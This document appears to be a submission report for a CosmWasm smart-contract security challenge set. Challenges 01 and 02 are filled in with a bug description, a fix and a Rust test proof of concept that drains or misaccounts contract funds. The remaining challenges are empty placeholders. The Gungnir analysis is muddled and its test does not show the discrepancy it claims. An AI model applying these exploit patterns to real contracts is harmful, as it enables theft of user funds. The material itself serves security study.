# Sample Report Template

## Challenge 01: _Mjolnir_

### Description

There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.

Here is the relevant code:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    for lockup in lockups {
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized { });
        }
        total_amount += lockup.amount;
        LOCKUPS.remove(deps.storage, lockup.id);
    }
    // ...
}
```

The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.

### Recommendation

To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    let mut ids = ids;
    ids.sort();
    ids.dedup();

    for lockup_id in ids.clone().into_iter() {
    // ...
}
```

With this fix, the contract will only withdraw 1 time per lockup id.

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let hacker = Addr::unchecked(HACKER.to_string());

    // mint funds to hacker
    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);

    // deposit
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
    )
    .unwrap();

    let msg = QueryMsg::GetLockup { id: 2 };
    let lockup: Lockup = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
    assert_eq!(lockup.owner, hacker);

    // fast forward to LOCK_PERIOD
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // "hacker" tries to drain contract
    let msg = ExecuteMsg::Withdraw {
        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
    };
    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
    assert!(res.is_ok());

    // verify funds received should match deposit amount
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
}
```

---

## Challenge 02: _Gungnir_

### Description

The `total_tokens` variable is updated when a deposit or withdrawal occurs but not when staking or unstaking. As a result, this might cause an accounting / balance discrepancy between the `total_tokens` and `voting_power`.

Suppose a user has 100 tokens and they decide to stake 70 tokens. Now, they have 70 `voting_power` and 100 `total_tokens`. Now, let's say the user unstakes 50 tokens. As per the code, the `voting_power` will be reduced to 20 but the `total_tokens` will still remain at 100. Now, if the user decides to withdraw 90 tokens, they will be able to do so because as per the withdraw function, the `total_tokens` (100) is more than the `voting_power` (20).

After these transactions, the user has 20 `voting_power` but they have withdrawn all their tokens (100 tokens initially deposited - 90 tokens withdrawn = 10 tokens remaining in `total_tokens` but these were staked). The remaining voting power despite having no tokens can result in a discrepancy.

### Recommendation

This exploit can be resolved by adjusting the `total_tokens` whenever a user stakes or unstakes. The stake function should decrease `total_tokens` by `lock_amount` and the unstake function should increase `total_tokens` by `unlock_amount`. This would ensure that `total_tokens` always reflects the actual number of unstaked tokens a user has and prevent any possible discrepancy.

```rust
pub fn stake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    lock_amount: u128,
) -> Result<Response, ContractError> {
    // increase voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    user.voting_power += lock_amount;
    user.total_tokens -= lock_amount;

    // ...
}

pub fn unstake(deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
    user.total_tokens += unlock_amount;

    // ...
}

```

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let amount = Uint128::new(50);

    app = mint_tokens(app, HACKER.to_string(), amount);
    let hacker = Addr::unchecked(HACKER);

    // deposit 50 funds for hacker
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(amount.u128(), DENOM)],
    )
    .unwrap();

    // The hacker stakes 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Stake { lock_amount: 50 },
        &[],
    )
    .unwrap();

    // The hacker tries to withdraw 50 tokens unsuccessfully
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Withdraw {
            amount: Uint128::from(50u128),
        },
        &[],
    )
    .unwrap_err();

    // funds are not received
    let balance = app
        .wrap()
        .query_balance(hacker.clone(), DENOM)
        .unwrap()
        .amount;
    assert_eq!(balance, Uint128::from(0u128));

    // query user for voting power
    // should be 50 tokens
    let msg = QueryMsg::GetVotingPower {
        user: (&HACKER).to_string(),
    };
    let voting_power: u128 = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(voting_power, 50_u128);

    // fast forward time
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // The hacker unstakes 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Unstake {
            unlock_amount: 50u128,
        },
        &[],
    )
    .unwrap();

    // The hacker withdraws 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Withdraw {
            amount: Uint128::from(50u128),
        },
        &[],
    )
    .unwrap();

    // funds are received
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, Uint128::from(50u128));

    // query user for voting power
    // should be 0 tokens
    let msg = QueryMsg::GetVotingPower {
        user: (&HACKER).to_string(),
    };
    let voting_power: u128 = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(voting_power, 0_u128);
}
```

---

## Challenge 03: _Laevateinn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 04: _Gram_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: _Draupnir_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 06: _Hofund_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 07: _Tyrfing_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: _Gjallarhorn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: _Brisingamen_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: _Mistilteinn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
